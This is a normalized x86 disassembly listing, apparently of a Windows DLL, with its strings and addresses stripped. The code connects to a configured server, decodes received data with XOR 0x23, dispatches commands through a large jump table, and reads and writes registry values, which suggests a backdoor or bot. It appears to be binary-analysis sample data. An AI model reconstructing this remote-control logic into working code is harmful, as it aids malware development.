pop esi
pop ecx
retn
mov ecx [ esi ]
xor edx edx
mov [ rw-data ] ecx
mov dx [ esi + 0x4 ]
xor eax eax
mov [ rw-data ] edx
mov ax [ esi + 0x6 ]
xor ecx ecx
mov [ rw-data ] eax
mov cx [ esi + 0x8 ]
push esi
mov [ rw-data ] ecx
call [ free@IAT ]
add esp 0x4
mov eax 0x1
pop esi
pop ecx
retn
push esi
call [ free@IAT ]
add esp 0x4
xor eax eax
pop esi
pop ecx
retn
sub_100039f0
sub esp 0x788
push 0x3e800
call [ malloc@IAT ]
add esp 0x4
mov [ esp ] eax
test eax eax
jne r-xdata
push ebx
push ebp
push esi
push edi
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x398 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebx ecx
or ecx 0xffffffff
inc ebx
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + ebx + 0x398 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov eax [ rw-data ]
mov esi rw-data
lea ebx [ ebx + ecx + 0x1 ]
mov ecx 0x27
lea edi [ esp + ebx + 0x398 ]
add ebx 0x9c
[ edi ] [ esi ]
mov cx [ rw-data ]
mov edi rw-data
mov [ esp + ebx + 0x398 ] cx
add ebx 0x2
test eax eax
mov eax [ rw-data ]
setne dl
mov [ esp + ebx + 0x398 ] dl
inc ebx
or ecx 0xffffffff
mov [ esp + ebx + 0x398 ] eax
xor eax eax
add ebx 0x4
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + ebx + 0x398 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov ebp [ strrchr@IAT ]
[ edi ]
not ecx
dec ecx
push 0x5c
push rw-data
add ebx ecx
call ebp
mov esi eax
add esp 0x8
test esi esi
je r-xdata
add esp 0x788
retn
call [ GetTickCount@IAT ]
xor edx edx
mov esi 0x36ee80
mov ecx eax
div esi
mov eax 0x45e7b273
mul edx
shr edx 0xe
mov eax 0x95217cb1
push edx
mul ecx
shr edx 0x15
push edx
lea ecx [ esp + 0xa0 ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0xa8 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + ebx + 0x3a8 ]
[ edi ]
not ecx
sub edi ecx
push 0x2f
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xac ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0xac ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi rw-data
lea ebx [ ebx + ecx + 0x1 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0xac ]
push ecx
call ebp
mov edx eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x18
lea ebp [ esp + ebx + 0x398 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
test edx edx
[ edi ] [ esi ]
je r-xdata
mov ecx [ rw-data ]
mov al [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x20 ] al
mov ecx 0x1d
xor eax eax
lea edi [ esp + 0x21 ]
mov [ esp + 0x1c ] edx
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + ebx + 0x398 ]
[ edi ]
not ecx
sub edi ecx
push 0x1
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x39c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov edi [ esp + 0x14 ]
mov eax [ rw-data ]
not ecx
dec ecx
lea ebx [ ebx + ecx + 0x1 ]
lea ecx [ esp + 0x18 ]
push ecx
mov ecx [ rw-data ]
push edi
push ebx
push edx
push rw-data
push eax
push ecx
call [ inet_ntoa@IAT ]
push eax
call sub_10003720
push edi
mov esi eax
call [ free@IAT ]
add esp 0x24
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x788
retn
lea edi [ esp + 0x98 ]
or ecx 0xffffffff
xor eax eax
mov [ edx ] 0x0
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x98 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add ecx ebx
lea ebx [ ecx + edx + 0x1 ]
lea eax [ esp + 0x18 ]
inc esi
push eax
push esi
push rw-data
lea ecx [ esp + 0x2a4 ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x2ac ]
or ecx 0xffffffff
xor eax eax
add esp 0x14
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + ebx + 0x398 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x298 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea ebx [ ebx + ecx + 0x1 ]
mov ecx [ rw-data ]
lea edx [ esp + 0x18 ]
push ecx
push rw-data
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0x10
sub_10003da0
push ecx
push esi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
lea eax [ esp + 0x4 ]
push 0x0
push eax
push esi
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_10003720
add esp 0x20
test eax eax
jne r-xdata
pop esi
pop ecx
retn
mov ecx [ esp + 0x4 ]
push edi
push ecx
push esi
call sub_10003e10
push esi
mov edi eax
call [ free@IAT ]
add esp 0xc
mov eax edi
pop edi
pop esi
pop ecx
retn
push esi
call [ free@IAT ]
add esp 0x4
xor eax eax
pop esi
pop ecx
retn
sub_10003e10
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
xor ebp ebp
test edi edi
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edx [ esp + 0x14 ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
pop edi
add ecx ebp
pop esi
pop ebp
pop ebx
mov ecx [ ecx + edx + 0x1 ]
mov edx [ rw-data ]
cmp ecx edx
sete al
retn
inc ebp
cmp ebp edi
jl r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
mov esi rw-data
lea eax [ edx + ebp ]
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
sub_10003e90
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
lea esi [ ebx + ebx * 4 + 0x3a98 ]
push edi
xor edi edi
shl esi 0x1
call [ GetTickCount@IAT ]
test ebx ebx
mov [ rw-data ] eax
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov ebp [ esp + 0x14 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
call sub_10008160
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edx [ rw-data ]
mov eax ebx
sub eax edi
push 0x0
lea ecx [ edi + ebp ]
push eax
push ecx
push edx
call [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
add edi eax
mov eax ebx
sub eax edi
add eax 0xbb8
lea esi [ eax + eax * 4 ]
shl esi 0x1
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x0
push 0x1
call [ Sleep@IAT ]
mov eax esi
dec esi
test eax eax
je r-xdata
jmp r-xdata
cmp edi ebx
jl r-xdata
sub_10003f40
sub esp 0x200
push ebx
mov ebx [ esp + 0x208 ]
cmp [ ebx ] 0x41
je r-xdata
push edi
mov edx [ rw-data ]
mov ecx 0x80
xor eax eax
lea edi [ esp + 0x8 ]
[ edi ]
mov ecx [ ebx + 0x1 ]
mov eax [ rw-data ]
push ecx
push 0x1
push rw-data
push edx
push eax
call [ inet_ntoa@IAT ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
call sub_100043e0
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x20 ]
[ edi ]
not ecx
dec ecx
push ecx
push edx
call sub_10003e90
add esp 0x20
test eax eax
pop edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x20c ]
push eax
push ebx
call sub_10003e90
add esp 0x8
pop ebx
add esp 0x200
retn
pop ebx
add esp 0x200
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] 0x0
call [ closesocket@IAT ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
call sub_100048a0
test eax eax
jne r-xdata
push esi
mov esi [ Sleep@IAT ]
pop ebx
add esp 0x200
retn
push 0x1
call esi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop esi
sub_10004030
push ecx
push ebp
push 0x3e800
call [ malloc@IAT ]
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
pop ebp
pop ecx
retn
push ebx
push esi
push edi
xor edi edi
inc edi
cmp edi 0x3
jl r-xdata
mov ecx [ esp + 0x10 ]
mov esi rw-data
mov eax ebp
mov [ ecx + ebp ] 0x0
lea eax [ esp + 0x10 ]
push 0x0
push eax
push ebp
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_10003720
add esp 0x20
test eax eax
je r-xdata
push ebp
call [ free@IAT ]
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
pop ecx
retn
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call [ free@IAT ]
add esp 0x4
pop edi
pop esi
pop ebx
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_10004140
push rw-data
call sub_10008de0
add esp 0x4
test eax eax
jne r-xdata
push rw-data
call sub_10008b00
add esp 0x4
test eax eax
jne r-xdata
retn
push rw-data
push rw-data
call sub_10008c20
add esp 0x8
retn
retn
sub_100041d0
sub esp 0x408
lea eax [ esp + 0x8 ]
push ebx
push ebp
push esi
push edi
push 0x400
push eax
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x18 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ rw-data ]
lea ecx [ esp + 0x18 ]
push 0x400
push ecx
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x18 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ rw-data ]
lea ecx [ esp + 0x18 ]
push 0x400
push ecx
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x18 ]
and ecx 0x3
[ edi ] [ esi ]
push eax
call [ rw-data ]
mov esi [ Sleep@IAT ]
mov ebp [ ioctlsocket@IAT ]
xor ebx ebx
mov edi 0x1
mov eax [ rw-data ]
mov [ rw-data ] ebx
cmp eax ebx
mov [ rw-data ] ebx
jne r-xdata
push eax
call [ closesocket@IAT ]
call sub_10008160
push 0x32
call esi
call sub_10004110
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
call sub_10004140
test eax eax
jne r-xdata
call sub_10003950
test eax eax
jne r-xdata
call sub_100039f0
test eax eax
jne r-xdata
push 0x1d4c0
call esi
jmp r-xdata
call sub_10003da0
test eax eax
jne r-xdata
push 0x2710
call esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
cmp eax ebx
mov [ rw-data ] ebx
je r-xdata
call sub_100048a0
test eax eax
jne r-xdata
push 0x2710
call esi
jmp r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x8004667e
push edx
mov [ esp + 0x1c ] edi
call ebp
lea eax [ esp + 0x14 ]
mov [ rw-data ] edi
push eax
push ebx
push ebx
push sub_10004e40
push ebx
push ebx
mov [ rw-data ] bl
call [ CreateThread@IAT ]
mov [ rw-data ] edi
push 0x2710
call esi
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
call sub_10004ad0
push edi
call esi
jmp r-xdata
cmp [ rw-data ] ebx
jne r-xdata
sub_100043e0
mov eax [ esp + 0xc ]
sub esp 0x10
lea ecx [ esp ]
push ebx
push esi
push edi
push eax
push rw-data
push ecx
call [ sprintf@IAT ]
mov edx [ esp + 0x3c ]
add esp 0xc
test edx edx
mov edi rw-data
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
mov ebx [ esp + 0x20 ]
push ebp
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edi rw-data
mov edi [ esp + 0x30 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
cmp edx 0x1
[ edi ] [ esi ]
jne r-xdata
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov ebp ecx
mov esi edi
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x28 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov ebp ecx
mov esi edi
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x28 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
dec edi
mov ecx ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
pop ebp
and ecx 0x3
cmp edx 0x1
[ edi ] [ esi ]
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
add esp 0x10
retn
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x34 ]
mov ecx edx
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
sub_100046a0
mov eax 0x2008
call sub_10008f00
push ebx
mov ebx [ esp + 0x2010 ]
push ebp
mov ebp [ recv@IAT ]
push esi
push edi
xor edi edi
lea esi [ esp + 0x18 ]
mov [ esp + 0x14 ] edi
mov [ esp + 0x10 ] edi
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x2008
retn
cmp eax 0xffffffff
jne r-xdata
mov al [ esi ]
cmp al 0xd
je r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
mov eax [ esp + 0x14 ]
inc eax
cmp eax 0x4
mov [ esp + 0x14 ] eax
jge r-xdata
cmp al 0xa
je r-xdata
push 0x1
call [ Sleep@IAT ]
mov eax edi
inc edi
cmp eax 0x1388
jg r-xdata
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x18 ]
push rw-data
push edx
mov [ esp + ecx + 0x21 ] 0x0
call [ strstr@IAT ]
add esp 0x8
neg eax
sbb eax eax
pop edi
and eax 0x2
pop esi
pop ebp
dec eax
pop ebx
add esp 0x2008
retn
mov eax [ esp + 0x10 ]
inc eax
inc esi
cmp eax 0x2000
mov [ esp + 0x10 ] eax
ja r-xdata
mov [ esp + 0x14 ] 0x0
jmp r-xdata
jmp r-xdata
push 0x1
call [ Sleep@IAT ]
jmp r-xdata
push 0x0
push 0x1
push esi
push ebx
call ebp
test eax eax
je r-xdata
sub_10004780
mov eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0xc ]
test esi esi
mov [ eax ] esi
jle r-xdata
pop esi
retn
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
sub ecx eax
mov dl [ ecx + eax ]
xor dl 0x23
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
sub_100047b0
sub esp 0x104
push esi
lea eax [ esp + 0x4 ]
push edi
push eax
push rw-data
mov [ esp + 0x10 ] 0xff
call [ rw-data ]
mov ecx [ esp + 0x8 ]
lea edx [ esp + 0xc ]
push 0xff
push edx
mov [ ecx + rw-data ] 0x0
call [ gethostname@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
lea eax [ esp + 0xc ]
push eax
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
add esp 0x104
retn
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call [ inet_ntoa@IAT ]
mov edi eax
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
add esp 0x104
retn
sub_10004870
mov eax [ esp + 0x4 ]
push eax
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
xor eax eax
retn
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call [ inet_ntoa@IAT ]
retn
sub_100048a0
mov eax [ rw-data ]
sub esp 0x124
test eax eax
push ebx
mov ebx [ htons@IAT ]
push ebp
mov ebp [ connect@IAT ]
push esi
push edi
mov edi [ ioctlsocket@IAT ]
mov esi 0x1
jne r-xdata
push 0x0
push esi
push 0x2
call [ socket@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
jne r-xdata
push 0x0
push esi
push 0x2
mov [ rw-data ] 0x0
call [ socket@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
jne r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] esi
push ecx
push 0x8004667e
push eax
call edi
mov ax [ rw-data ]
mov edx [ rw-data ]
push eax
mov [ esp + 0x18 ] 0x3c
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x38 ] edx
mov [ esp + 0x34 ] esi
mov [ esp + 0x20 ] 0x2
call ebx
push rw-data
mov [ esp + 0x22 ] ax
call [ inet_addr@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0x1c ]
push 0x10
push ecx
push edx
mov [ esp + 0x2c ] eax
call ebp
mov edx [ rw-data ]
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
push 0x0
push ecx
inc edx
push 0x0
push edx
call [ select@IAT ]
test eax eax
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x124
retn
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] esi
push ecx
push 0x8004667e
push eax
call edi
mov ax [ rw-data ]
mov edx [ rw-data ]
push eax
mov [ esp + 0x18 ] 0x3c
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x38 ] edx
mov [ esp + 0x34 ] esi
mov [ esp + 0x20 ] 0x2
call ebx
mov ecx [ rw-data ]
mov [ esp + 0x1e ] ax
mov eax [ rw-data ]
lea edx [ esp + 0x1c ]
push 0x10
push edx
push eax
mov [ esp + 0x2c ] ecx
call ebp
mov eax [ rw-data ]
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x34 ]
push 0x0
push edx
inc eax
push 0x0
push eax
call [ select@IAT ]
test eax eax
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x124
retn
mov [ rw-data ] esi
mov eax [ rw-data ]
push eax
call [ closesocket@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x124
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
call sub_10005130
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x124
retn
lea ecx [ esp + 0x2c ]
push ecx
push 0x0
push 0x0
push sub_10004eb0
push 0x0
push 0x0
call [ CreateThread@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x124
retn
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x124
retn
mov edx [ rw-data ]
push edx
call [ closesocket@IAT ]
sub_10004ad0
mov ecx [ rw-data ]
sub esp 0x100
mov eax ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi [ rw-data ]
xor ebx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
movsx edx [ rw-data ]
mov ecx [ rw-data ]
mov [ rw-data ] edx
mov [ rw-data ] ecx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call [ GetTickCount@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0xffffffbf
cmp eax 0x25
ja r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x1
cmp eax ebx
je r-xdata
jmp [ eax * 4 + jump_table_10004ca0 ]
mov eax [ rw-data ]
pop edi
pop esi
cmp eax ebx
pop ebx
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x11 ]
[ edi ]
not ecx
add ecx 0x4
mov edi rw-data
mov [ esp + 0xd ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0xc ] 0x5a
mov eax ecx
mov esi edi
mov edi edx
mov [ rw-data ] ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
add ecx 0x4
push ecx
lea ecx [ esp + 0x10 ]
push ecx
call sub_10003f40
add esp 0x8
call sub_10005bf0
jmp r-xdata
call sub_10005bd0
jmp r-xdata
call sub_10006df0
jmp r-xdata
call sub_10005ba0
jmp r-xdata
call sub_10005b50
jmp r-xdata
call sub_100056c0
jmp r-xdata
call sub_10006f10
jmp r-xdata
call sub_10006360
jmp r-xdata
call sub_10006f50
jmp r-xdata
call sub_10007000
jmp r-xdata
call sub_10006fe0
jmp r-xdata
call sub_100066b0
jmp r-xdata
push 0x4e
call sub_10006900
add esp 0x4
jmp r-xdata
call sub_10006a40
jmp r-xdata
call sub_10006bc0
jmp r-xdata
call sub_10006950
jmp r-xdata
call sub_10007040
jmp r-xdata
call sub_10007a00
jmp r-xdata
mov [ rw-data ] ebx
jmp r-xdata
call sub_10008130
jmp r-xdata
call sub_10007500
jmp r-xdata
call sub_10007590
jmp r-xdata
call sub_100075d0
jmp r-xdata
call sub_10007630
jmp r-xdata
call sub_10007670
mov eax 0x1
add esp 0x100
retn
call sub_10008160
sub_10004d40
sub esp 0x114
mov al [ rw-data ]
push ebx
push ebp
push esi
push edi
mov [ esp + 0x20 ] al
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x21 ]
lea edx [ esp + 0x20 ]
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x14 ]
xor esi esi
stosb [ edi ]
push ecx
lea eax [ esp + 0x20 ]
push edx
push eax
push rw-data
push rw-data
push 0x80000002
mov [ esp + 0x2c ] 0x104
call [ SHGetValueA@IAT ]
test eax eax
jne r-xdata
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x2
jbe r-xdata
mov esi 0x1
mov edi [ GetTickCount@IAT ]
call edi
mov ebx [ SHSetValueA@IAT ]
